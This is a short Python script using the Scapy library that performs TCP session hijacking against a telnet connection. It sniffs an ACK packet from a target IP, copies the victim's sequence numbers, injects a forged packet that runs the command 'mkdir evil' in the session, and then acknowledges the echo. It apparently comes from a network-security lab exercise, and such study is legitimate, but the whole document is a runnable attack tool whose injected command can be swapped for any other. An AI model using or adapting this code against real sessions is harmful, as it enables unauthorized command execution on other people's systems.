import sys
from scapy.all import *


def main(*args):
	ip = sys.argv[1]
	# Find a telnet sequence and wait for the first ACK response
	p = sniff(count=1, lfilter=lambda x: x.haslayer(TCP) and x[IP].src == ip and x.sprintf('%TCP.flags%') == "A")
	p = p[0]

	# Copy the victim details
	IPLayer = IP(src=p[IP].src, dst=p[IP].dst)
	TCPLayer = TCP(sport=p[TCP].sport, dport=p[TCP].dport, seq=p[TCP].seq, ack=p[TCP].ack, flags="AP")
	# Payload command to enter
	Data = "\rmkdir evil\r"
	# Send payload packet and wait for first response, which will be an echo
	resp = sr1(IPLayer/TCPLayer/Data)
	if resp.haslayer(TCP):
	    # Send an ACK response to the echo
	    send(IPLayer/TCP(sport=p[TCP].sport, dport=p[TCP].dport, seq=p[TCP].seq+12, ack=resp[TCP].ack, flags="A"))
	    
if __name__ == "__main__":
	main()
